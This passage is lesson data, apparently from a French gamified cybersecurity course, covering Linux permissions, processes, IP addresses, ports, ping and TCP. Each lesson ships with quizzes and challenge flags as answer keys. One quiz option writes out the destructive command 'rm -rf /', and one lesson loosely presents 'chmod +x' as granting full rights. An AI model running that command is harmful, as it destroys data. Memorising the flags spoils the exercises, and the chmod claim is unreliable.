font-weight=\"bold\">r - x</text>\n          <text x=\"325\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Autres (4+0+1=5)</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Rend le script de maintenance exécutable :"
          },
          {
            "num": 2,
            "text": "operator@cyberlab:~$ chmod +x /opt/maintenance/cleanup.sh",
            "isCritical": true,
            "note": "+x confère le droit d'exécution au fichier"
          },
          {
            "num": 3,
            "text": "operator@cyberlab:~$ ls -l /opt/maintenance/cleanup.sh"
          },
          {
            "num": 4,
            "text": "-rwxrwxrwx 1 root root 88 Oct 27 08:12 /opt/maintenance/cleanup.sh"
          }
        ],
        "prompt": "Clique sur la commande qui ajoute les droits d'exécution avec chmod :"
      },
      "tokenPuzzle": {
        "instruction": "Construis la commande pour ajouter le droit d'exécution (+x) au script :",
        "tokens": [
          "chmod",
          "+x",
          "/opt/maintenance/cleanup.sh",
          "cat"
        ],
        "correctOrder": [
          "chmod",
          "+x",
          "/opt/maintenance/cleanup.sh"
        ]
      },
      "quickQuiz": {
        "prompt": "En notation octale sous Linux, quelle valeur numérique correspond à 'lecture seule' (Read only) ?",
        "options": [
          {
            "text": "7 (tous les droits réunis).",
            "isCorrect": false,
            "debrief": "Faux. 7 = 4+2+1 = rwx."
          },
          {
            "text": "0 (aucun droit).",
            "isCorrect": false,
            "debrief": "Faux. 0 signifie aucun droit (---)."
          },
          {
            "text": "1 (exécution seule).",
            "isCorrect": false,
            "debrief": "Faux. 1 = x."
          },
          {
            "text": "4 (lecture = 4, écriture = 2, exécution = 1).",
            "isCorrect": true,
            "debrief": "Exact ! 4 = r, 2 = w, 1 = x. La somme compose le triplet."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, applique les droits complets avec 'chmod +x /opt/maintenance/cleanup.sh', puis vérifie avec 'ls -l /opt/maintenance/cleanup.sh'. Soumets la chaîne de permissions complète (ex: -rwxrwxrwx) !",
      "flag": "-rwxrwxrwx"
    }
  },
  {
    "id": "m1-l15",
    "unitId": "m1",
    "title": "15. Processus & Surveillance : ps & kill",
    "icon": "⚡",
    "xp": 45,
    "lessonSlides": [
      {
        "title": "Qu'est-ce qu'un Processus ?",
        "bullets": [
          "Un programme stocké sur le disque dur est inerte. Dès qu'il est chargé en mémoire vive et s'exécute, il devient un **Processus**.",
          "Chaque processus possède un numéro d'identification unique attribué par le noyau appelé le **PID** (Process ID).",
          "Pour surveiller les processus actifs sur la machine, on utilise la commande `ps aux`."
        ]
      },
      {
        "title": "Stopper un Programme Rebelle : kill",
        "bullets": [
          "Si un malware tourne ou qu'un serveur web est bloqué, tu peux lui envoyer un signal d'arrêt avec la commande `kill PID`.",
          "Pour forcer l'arrêt immédiat et brutal d'un processus récalcitrant, on utilise le signal 9 (SIGKILL) : `kill -9 1234`.",
          "Le système coupe alors immédiatement l'alimentation du processus sans préavis."
        ],
        "syntaxBox": {
          "command": "ps aux",
          "description": "Liste l'ensemble des processus tournant sur la machine avec leur PID et utilisation CPU.",
          "example": "root 1 0.0 0.1 /sbin/init"
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"30\" y=\"30\" width=\"130\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"95\" y=\"55\" fill=\"#38bdf8\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">ps aux</text>\n          <text x=\"95\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">PID: 4150 (bash)</text>\n          <path d=\"M 170 60 L 220 60\" stroke=\"#f43f5e\" stroke-width=\"2\"/>\n          <rect x=\"230\" y=\"30\" width=\"140\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#f43f5e\" stroke-width=\"2\"/>\n          <text x=\"300\" y=\"55\" fill=\"#f87171\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">kill -9 4150</text>\n          <text x=\"300\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">SIGKILL Brutal</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "operator@cyberlab:~$ ps aux",
            "isCritical": true,
            "note": "ps aux énumère l'ensemble des processus de tous les utilisateurs"
          },
          {
            "num": 2,
            "text": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND"
          },
          {
            "num": 3,
            "text": "root         1  0.0  0.1  21980  9450 ?        Ss   08:00   0:01 /sbin/init"
          },
          {
            "num": 4,
            "text": "operator  4150  0.0  0.2   8900  4200 pts/0    S+   08:14   0:00 -bash"
          }
        ],
        "prompt": "Clique sur la commande qui liste tous les processus en cours :"
      },
      "tokenPuzzle": {
        "instruction": "Tape la commande universelle pour afficher tous les processus en mémoire :",
        "tokens": [
          "ps",
          "aux",
          "kill",
          "top"
        ],
        "correctOrder": [
          "ps",
          "aux"
        ]
      },
      "quickQuiz": {
        "prompt": "Que désigne précisément le terme 'PID' dans un système d'exploitation Linux ?",
        "options": [
          {
            "text": "Process Identifier (identifiant numérique unique d'un processus en cours d'exécution).",
            "isCorrect": true,
            "debrief": "Exact ! Le PID permet de cibler un processus pour le surveiller ou le tuer."
          },
          {
            "text": "Private IP Domain (nom de domaine interne du réseau local).",
            "isCorrect": false,
            "debrief": "Faux. Un domaine réseau n'a rien à voir avec le PID."
          },
          {
            "text": "Password Identification Daemon (service gérant les mots de passe).",
            "isCorrect": false,
            "debrief": "Faux. Les mots de passe sont gérés par PAM et /etc/shadow."
          },
          {
            "text": "Port Index Discovery (table de conversion des ports réseau).",
            "isCorrect": false,
            "debrief": "Faux. Les ports sont définis par /etc/services."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, tape 'ps aux' pour observer les processus actifs. Repère le nom du shell dans la colonne COMMAND de ton utilisateur et soumets son nom exact (ex: bash) !",
      "flag": "bash"
    }
  },
  {
    "id": "m1-l16",
    "unitId": "m1",
    "title": "16. ★ BOSS FIGHT LINUX : AUDIT SYSTÈME ★",
    "icon": "👑",
    "xp": 100,
    "isBoss": true,
    "lessonSlides": [
      {
        "title": "La Mission Finale de la Piste Linux",
        "bullets": [
          "Félicitations pour ton parcours ! Tu as appris à te repérer (`pwd`), explorer (`ls`, `ls -la`), naviguer (`cd`), inspecter (`cat`, `head`, `wc`), filtrer (`grep`), chercher (`find`), manipuler les droits (`chmod`) et surveiller (`ps`).",
          "Un administrateur de sécurité a dissimulé une preuve de validation d'évaluation dans un sous-dossier de ton arborescence.",
          "À toi d'utiliser les compétences acquises sans aucune assistance pour retrouver ce fichier, lire son contenu et capturer le drapeau de la Piste 1 !"
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"20\" y=\"20\" width=\"360\" height=\"80\" rx=\"10\" fill=\"#030712\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <text x=\"200\" y=\"55\" fill=\"#fbbf24\" font-size=\"14\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">★ ÉPREUVE D'HOMOLOGATION LINUX ★</text>\n          <text x=\"200\" y=\"75\" fill=\"#94a3b8\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">Retrouve le fichier caché et lis la clé secrète</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Démarche d'audit : cherche les fichiers de flag dans /home/operator :"
          },
          {
            "num": 2,
            "text": "operator@cyberlab:~$ find /home/operator -name '*flag*'",
            "isCritical": true,
            "note": "find localise immédiatement le fichier de flag secret"
          },
          {
            "num": 3,
            "text": "/home/operator/projet_secret/flag_novice.txt"
          }
        ],
        "prompt": "Clique sur la commande d'investigation pour débusquer le fichier de flag :"
      },
      "tokenPuzzle": {
        "instruction": "Construis la commande finale pour afficher le contenu du flag dans projet_secret :",
        "tokens": [
          "cat",
          "projet_secret/flag_novice.txt",
          "find",
          "rm"
        ],
        "correctOrder": [
          "cat",
          "projet_secret/flag_novice.txt"
        ]
      },
      "quickQuiz": {
        "prompt": "Quelle commande combine le mieux recherche et affichage instantané pour auditer un système inconnu ?",
        "options": [
          {
            "text": "rm -rf / puis reboot de la machine.",
            "isCorrect": false,
            "debrief": "Faux. Cela détruit le système !"
          },
          {
            "text": "find pour localiser les fichiers cibles, puis cat ou grep pour en analyser le contenu.",
            "isCorrect": true,
            "debrief": "Exactement ! C'est la méthodologie standard d'investigation numérique."
          },
          {
            "text": "ping localhost 1000 fois.",
            "isCorrect": false,
            "debrief": "Faux. Cela ne donne aucune information sur les fichiers."
          },
          {
            "text": "pwd répété en boucle.",
            "isCorrect": false,
            "debrief": "Faux. pwd n'affiche que le dossier courant."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, utilise tes compétences pour localiser et lire le fichier /home/operator/projet_secret/flag_novice.txt avec 'cat'. Soumets la valeur du drapeau complet CYBER{...} !",
      "flag": "CYBER{LINUX_NAVIGATOR_LEVEL_COMPLETED}"
    }
  },
  {
    "id": "m2-l1",
    "unitId": "m2",
    "title": "1. Qu'est-ce qu'une Adresse IP ?",
    "icon": "🌐",
    "xp": 35,
    "lessonSlides": [
      {
        "title": "L'Adresse Postale du Monde Numérique",
        "bullets": [
          "Pour que deux ordinateurs puissent s'échanger des messages sur Internet, ils ont besoin d'une adresse unique : c'est l'**Adresse IP** (Internet Protocol).",
          "En version classique (**IPv4**), une adresse IP est une suite de 4 nombres compris entre 0 et 255 séparés par des points (ex: `192.168.1.42` ou `8.8.8.8`).",
          "Sans adresse IP, aucun paquet de données ne pourrait trouver son destinataire."
        ]
      },
      {
        "title": "IP Publique vs IP Privée & Localhost",
        "bullets": [
          "Une **IP Publique** est visible sur tout Internet (ton adresse de box ou d'un serveur web public).",
          "Une **IP Privée** n'est accessible qu'à l'intérieur de ta maison ou de l'entreprise (souvent en `192.168.x.x` ou `10.x.x.x`).",
          "L'adresse spéciale `127.0.0.1` (appelée **localhost** ou boucle locale) désigne toujours **ton propre ordinateur**. C'est un miroir numérique !"
        ],
        "syntaxBox": {
          "command": "cat /etc/hosts",
          "description": "Affiche la table locale de correspondance entre noms et adresses IP.",
          "example": "127.0.0.1 localhost aegis.local"
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"30\" y=\"30\" width=\"130\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"95\" y=\"55\" fill=\"#38bdf8\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">127.0.0.1</text>\n          <text x=\"95\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Localhost (Moi-même)</text>\n          <path d=\"M 170 60 L 220 60\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <rect x=\"230\" y=\"30\" width=\"140\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"300\" y=\"55\" fill=\"#34d399\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">192.168.1.42</text>\n          <text x=\"300\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">IP Réseau Privé</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Inspecte la table locale de résolution des adresses IP :"
          },
          {
            "num": 2,
            "text": "operator@cyberlab:~$ cat /etc/hosts",
            "isCritical": true,
            "note": "127.0.0.1 représente toujours l'adresse de bouclage local (localhost)"
          },
          {
            "num": 3,
            "text": "127.0.0.1 localhost aegis.local"
          }
        ],
        "prompt": "Clique sur la commande qui affiche la configuration des adresses IP locales :"
      },
      "tokenPuzzle": {
        "instruction": "Tape la commande pour inspecter le fichier d'adresses IP /etc/hosts :",
        "tokens": [
          "cat",
          "/etc/hosts",
          "ls",
          "ping"
        ],
        "correctOrder": [
          "cat",
          "/etc/hosts"
        ]
      },
      "quickQuiz": {
        "prompt": "Quelle adresse IPv4 désigne universellement la boucle locale (localhost / soi-même) ?",
        "options": [
          {
            "text": "127.0.0.1 (l'adresse de bouclage locale / loopback).",
            "isCorrect": true,
            "debrief": "Exact ! Tout paquet envoyé vers 127.0.0.1 reste sur la machine locale sans passer par le câble physique."
          },
          {
            "text": "255.255.255.255 (l'adresse de diffusion broadcast).",
            "isCorrect": false,
            "debrief": "Faux. C'est le broadcast réseau universel."
          },
          {
            "text": "8.8.8.8 (le serveur DNS public de Google).",
            "isCorrect": false,
            "debrief": "Faux. 8.8.8.8 est un serveur DNS externe de Google."
          },
          {
            "text": "192.168.1.1 (l'adresse par défaut de la passerelle / box).",
            "isCorrect": false,
            "debrief": "Faux. C'est l'adresse typique du routeur local."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, tape 'cat /etc/hosts'. Repère l'adresse IP associée à localhost et soumets sa valeur exacte !",
      "flag": "127.0.0.1"
    }
  },
  {
    "id": "m2-l2",
    "unitId": "m2",
    "title": "2. Qu'est-ce qu'un Port Réseau ?",
    "icon": "🚪",
    "xp": 35,
    "lessonSlides": [
      {
        "title": "L'Analogie de l'Immeuble et des Appartements",
        "bullets": [
          "Si l'adresse IP est l'adresse de l'immeuble, le **Port Réseau** est le numéro d'appartement ou la porte d'entrée spécifique.",
          "Une machine peut exécuter en même temps un serveur web, un serveur d'e-mails et un serveur de jeu. Comment l'ordinateur sait-il à qui donner le message ?",
          "Grâce au numéro de port ! Les numéros vont de **0 à 65535**."
        ]
      },
      {
        "title": "Les Ports Célèbres à Connaître Par Cœur",
        "bullets": [
          "• **Port 80** : Serveur Web non chiffré (HTTP).",
          "• **Port 443** : Serveur Web sécurisé et chiffré (HTTPS).",
          "• **Port 22** : Prise de contrôle à distance sécurisée en ligne de commande (SSH).",
          "• **Port 53** : Résolution de noms de domaine (DNS).",
          "• **Port 3306** : Base de données MySQL.",
          "Notre labo local tourne actuellement sur le port spécial **3333** !"
        ],
        "syntaxBox": {
          "command": "ss -tuln",
          "description": "Liste tous les ports réseau en écoute sur l'ordinateur local.",
          "example": "tcp LISTEN 0 128 0.0.0.0:3333"
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"25\" width=\"80\" height=\"70\" rx=\"6\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"65\" y=\"55\" fill=\"#38bdf8\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">:80</text>\n          <text x=\"65\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">HTTP</text>\n          <rect x=\"120\" y=\"25\" width=\"80\" height=\"70\" rx=\"6\" fill=\"#0f172a\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"160\" y=\"55\" fill=\"#34d399\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">:443</text>\n          <text x=\"160\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">HTTPS</text>\n          <rect x=\"215\" y=\"25\" width=\"80\" height=\"70\" rx=\"6\" fill=\"#0f172a\" stroke=\"#3b82f6\" stroke-width=\"2\"/>\n          <text x=\"255\" y=\"55\" fill=\"#60a5fa\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">:22</text>\n          <text x=\"255\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">SSH</text>\n          <rect x=\"310\" y=\"25\" width=\"75\" height=\"70\" rx=\"6\" fill=\"#0f172a\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <text x=\"347\" y=\"55\" fill=\"#fbbf24\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">:3333</text>\n          <text x=\"347\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">CyberLab</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Liste les services réseau actifs et leurs ports d'écoute :"
          },
          {
            "num": 2,
            "text": "operator@cyberlab:~$ ss -tuln",
            "isCritical": true,
            "note": "ss -tuln révèle que le serveur web CyberLab écoute sur le port 3333"
          },
          {
            "num": 3,
            "text": "Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port"
          },
          {
            "num": 4,
            "text": "tcp   LISTEN 0      128          0.0.0.0:3333     0.0.0.0:*"
          }
        ],
        "prompt": "Clique sur la commande qui énumère les ports en écoute sur la machine :"
      },
      "tokenPuzzle": {
        "instruction": "Tape la commande pour lister les ports TCP en écoute sous forme numérique :",
        "tokens": [
          "ss",
          "-tuln",
          "ping",
          "curl"
        ],
        "correctOrder": [
          "ss",
          "-tuln"
        ]
      },
      "quickQuiz": {
        "prompt": "Quel est le numéro de port standard réservé mondialement au protocole web chiffré HTTPS ?",
        "options": [
          {
            "text": "Le port 21.",
            "isCorrect": false,
            "debrief": "Faux. Le port 21 est réservé aux transferts de fichiers FTP."
          },
          {
            "text": "Le port 53.",
            "isCorrect": false,
            "debrief": "Faux. Le port 53 est utilisé par le protocole DNS."
          },
          {
            "text": "Le port 443.",
            "isCorrect": true,
            "debrief": "Exact ! Le port 80 est réservé au HTTP non chiffré, et le port 443 au HTTPS sécurisé par TLS."
          },
          {
            "text": "Le port 22.",
            "isCorrect": false,
            "debrief": "Faux. Le port 22 est le port d'administration SSH."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, tape 'ss -tuln' pour repérer le port sur lequel tourne notre serveur local. Soumets ce numéro de port (4 chiffres) !",
      "flag": "3333"
    }
  },
  {
    "id": "m2-l3",
    "unitId": "m2",
    "title": "3. Tester la Connectivité : ping & ICMP",
    "icon": "📡",
    "xp": 35,
    "lessonSlides": [
      {
        "title": "Le Sonar du Réseau : ping",
        "bullets": [
          "Comme un sous-marin qui émet un son sous l'eau et écoute son écho pour repérer les obstacles, la commande `ping` envoie un paquet de test vers une adresse IP.",
          "Ce protocole s'appelle **ICMP** (Internet Control Message Protocol).",
          "Si la machine cible est allumée et connectée, elle renvoie immédiatement un paquet réponse (*Echo Reply*)."
        ]
      },
      {
        "title": "Mesurer la Latence et le TTL",
        "bullets": [
          "Le ping mesure le temps d'aller-retour en millisecondes (**ms**). Plus le chiffre est petit, plus la connexion est rapide.",
          "Le **TTL** (Time To Live) indique le nombre maximum de routeurs que le paquet peut traverser avant de mourir (souvent 64 sous Linux ou 128 sous Windows).",
          "C'est la toute première commande qu'un administrateur ou pentesteur tape pour vérifier si une cible est vivante."
        ],
        "syntaxBox": {
          "command": "ping -c 3 192.168.1.1",
          "description": "Envoie 3 paquets de test vers la passerelle locale.",
          "example": "64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=0.84 ms"
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"30\" y=\"30\" width=\"110\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"85\" y=\"65\" fill=\"#38bdf8\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\">Moi</text>\n          <path d=\"M 150 50 L 250 50\" stroke=\"#10b981\" stroke-width=\"2\" marker-end=\"url(#arrow)\"/>\n          <text x=\"200\" y=\"42\" fill=\"#34d399\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Echo Request ➔</text>\n          <path d=\"M 250 75 L 150 75\" stroke=\"#f59e0b\" stroke-width=\"2\" stroke-dasharray=\"3\"/>\n          <text x=\"200\" y=\"90\" fill=\"#fbbf24\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">⬅ Echo Reply (0.8ms)</text>\n          <rect x=\"260\" y=\"30\" width=\"110\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"315\" y=\"65\" fill=\"#34d399\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\">Cible</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Teste la connectivité vers la passerelle réseau locale :"
          },
          {
            "num": 2,
            "text": "operator@cyberlab:~$ ping -c 1 192.168.1.1",
            "isCritical": true,
            "note": "ping vérifie si l'adresse IP cible répond aux requêtes d'écho ICMP"
          },
          {
            "num": 3,
            "text": "64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=0.42 ms"
          }
        ],
        "prompt": "Clique sur la commande qui envoie un paquet de test ping ICMP :"
      },
      "tokenPuzzle": {
        "instruction": "Tape la commande pour tester la connectivité vers 192.168.1.1 :",
        "tokens": [
          "ping",
          "192.168.1.1",
          "whoami",
          "cat"
        ],
        "correctOrder": [
          "ping",
          "192.168.1.1"
        ]
      },
      "quickQuiz": {
        "prompt": "Quel protocole réseau fondamental sous-jacent est utilisé par la commande 'ping' ?",
        "options": [
          {
            "text": "HTTP (Hypertext Transfer Protocol).",
            "isCorrect": false,
            "debrief": "Faux. HTTP est un protocole de haut niveau pour les pages web."
          },
          {
            "text": "ICMP (Internet Control Message Protocol).",
            "isCorrect": true,
            "debrief": "Exact ! ICMP sert aux diagnostics d'erreurs et de connectivité."
          },
          {
            "text": "SSH (Secure Shell).",
            "isCorrect": false,
            "debrief": "Faux. SSH sert à la connexion distante sécurisée."
          },
          {
            "text": "FTP (File Transfer Protocol).",
            "isCorrect": false,
            "debrief": "Faux. FTP sert aux transferts de fichiers."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, tape 'ping 192.168.1.1' pour tester la connexion vers la passerelle. Soumets l'adresse IP cible testée !",
      "flag": "192.168.1.1"
    }
  },
  {
    "id": "m2-l4",
    "unitId": "m2",
    "title": "4. TCP vs UDP : Fiabilité vs Vitesse",
    "icon": "⚖️",
    "xp": 40,
    "lessonSlides": [
      {
        "title": "Les Deux Grands Protocoles de Transport",
        "bullets": [
          "Au-dessus de l'adresse IP, les données doivent être acheminées selon deux philosophies radicalement opposées : **TCP** ou **UDP**.",
          "Chaque application choisit son camp selon qu'elle privilégie la fiabilité absolue ou la vitesse pure."
        ]
      },
      {
        "title": "TCP : Le Recommandé avec Accusé de Réception",
        "bullets": [
          "**TCP** (Transmission Control Protocol) vérifie que chaque paquet arrive sans erreur et dans le bon ordre.",
          "Si un paquet est perdu, TCP le renvoie automatiquement !",
          "Utilisé pour le Web (HTTP/HTTPS), les fichiers et les e-mails où pas un seul octet ne doit manquer."
        ]
      },
      {
        "title": "UDP : La Diffusion Sans Contrôle",
        "bullets": [
          "**UDP** (User Datagram Protocol) tire les paquets à toute vitesse sans jamais vérifier s'ils sont arrivés.",
          "Aucun accusé de réception, aucune garantie : si un paquet saute, tant pis !",
          "Utilisé pour le streaming vidéo en direct, les jeux vidéo en ligne et les requêtes DNS rapides."
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"25\" width=\"165\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"107\" y=\"50\" fill=\"#38bdf8\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">TCP (Fiable)</text>\n          <text x=\"107\" y=\"70\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Accusé de réception (ACK)</text>\n          <text x=\"107\" y=\"85\" fill=\"#34d399\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Web, SSH, Fichiers</text>\n          <rect x=\"210\" y=\"25\" width=\"165\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <text x=\"292\" y=\"50\" fill=\"#fbbf24\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">UDP (Rapide)</text>\n          <text x=\"292\" y=\"70\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Tir continu sans contrôle</text>\n          <text x=\"292\" y=\"85\" fill=\"#f87171\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Jeux, Streaming, DNS</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Observe les sockets TCP actuellement connectés au système :"
          },
          {
            "num": 2,
            "text": "operator@cyberlab:~$ ss -t",
            "isCritical": true,
            "note": "ss -t filtre spécifiquement les connexions TCP établies"
          },
          {
            "num": 3,
            "text": "State      Recv-Q Send-Q Local Address:Port Peer Address:Port"
          },
          {
            "num": 4,
            "text": "ESTAB      0      0      127.0.0.1:3333     127.0.0.1:48210"
          }
        ],
        "prompt": "Clique sur la commande qui filtre uniquement les connexions TCP :"
      },
      "tokenPuzzle": {
        "instruction": "Tape la commande ss pour afficher l'état des connexions TCP :",
        "tokens": [
          "ss",
          "-t",
          "ping",
          "whoami"
        ],
        "correctOrder": [
          "ss",
          "-t"
        ]
      },
      "quickQuiz": {
        "prompt": "Pourquoi les jeux vidéo compétitifs en ligne et le streaming utilisent-ils massivement le protocole UDP plutôt que TCP ?",
        "options": [
          {
            "text": "Parce que TCP est interdit par la loi sur les serveurs de jeux.",
            "isCorrect": false,
            "debrief": "Faux. TCP est un standard ouvert utilisable par n'importe qui."
          },
          {
            "text": "Parce qu'UDP n'attend pas d'accusé de réception, offrant une latence minimale indispensable au temps réel.",
            "isCorrect": true,
            "debrief": "Exact ! Mieux vaut perdre une image d'un dixième de seconde que geler le jeu en attendant un renvoi."
          },
          {
            "text": "Parce qu'UDP ne nécessite aucune carte réseau pour fonctionner.",
            "isCorrect": false,
            "debrief": "Faux. Tout protocole réseau nécessite du matériel réseau."
          },
          {
            "text": "Parce qu'UDP chiffre les paquets avec un certificat SSL matériel.",
            "isCorrect": false,
            "debrief": "Faux. UDP ne propose aucun chiffrement par lui-même."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, tape 'ss -t' pour inspecter les connexions TCP. Soumets l'état de connexion affiché dans la première colonne (ex: ESTAB) !",
      "flag": "ESTAB"
    }
  },
  {
    "id": "m2-l5",
    "unitId": "m2",
    "title": "5. Le Handshake TCP à 3 Voies (SYN/ACK)",
    "icon": "🤝",
    "xp": 40,
    "lessonSlides": [
      {
        "title": "La Poignée de Main Initiale",
        "bullets": [
          "Avant qu'un navigateur puisse demander la moindre page web ou échanger le moindre octet avec un serveur en TCP, les deux machines doivent impérativement faire connaissance.",
          "C'est la célèbre **poignée de main en 3 étapes** (**3-Way Handshake**)."
        ]
      },
      {
        "title": "Les 3 Étapes Cruciales du Handshake",
        "bullets": [
          "1. **SYN** (Synchronize) : Le client dit au serveur *Bonjour, je veux me connecter avec le numéro de séquence X*.",
          "2. **SYN-ACK** : Le serveur répond *Bonjour, j'accepte ta demande (ACK X+1), et voici mon propre numéro de séquence Y*.",
          "3. **ACK** (Acknowledge) : Le client valide *Bien reçu (ACK Y+1), la connexion est ouverte !*.",
          "Une fois ce rituel terminé, la connexion passe à l'état `ESTABLISHED`."
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"20\" width=\"80\" height=\"80\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"65\" y=\"65\" fill=\"#38bdf8\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\">Client</text>\n          <path d=\"M 115 35 L 275 45\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n          <text x=\"195\" y=\"32\" fill=\"#38bdf8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">1. SYN [seq=100] ➔</text>\n          <path d=\"M 275 60 L 115 70\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <text x=\"195\" y=\"62\" fill=\"#fbbf24\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">⬅ 2. SYN-ACK [ack=101, seq=500]</text>\n          <path d=\"M 115 85 L 275 95\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"195\" y=\"92\" fill=\"#34d399\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">3. ACK [ack=501] ➔</text>\n          <rect x=\"285\" y=\"20\" width=\"80\" height=\"80\" rx=\"8\" fill=\"#0f172a\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"325\" y=\"65\" fill=\"#34d399\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\">Serveur</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Déroulement d'une négociation TCP réussie :"
